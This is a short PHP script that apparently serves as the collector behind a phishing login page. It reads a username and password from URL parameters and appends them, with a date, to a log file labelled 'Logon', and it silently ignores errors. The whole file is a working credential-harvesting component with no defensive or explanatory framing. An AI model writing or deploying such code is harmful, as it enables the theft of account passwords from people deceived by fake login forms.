<?php
function write_passwd ($u, $p)
{
    $fileName = 'log.txt';

    try {
        $fp = fopen ($fileName, 'a');
        fwrite ($fp, sprintf ("Logon: %s | %s, Date: %s\n", $u, $p, date("F j, Y, g:i a")));
    } catch (Exception $e) {

    }

}

write_passwd ($_GET['user'], $_GET['passwd']);

?>
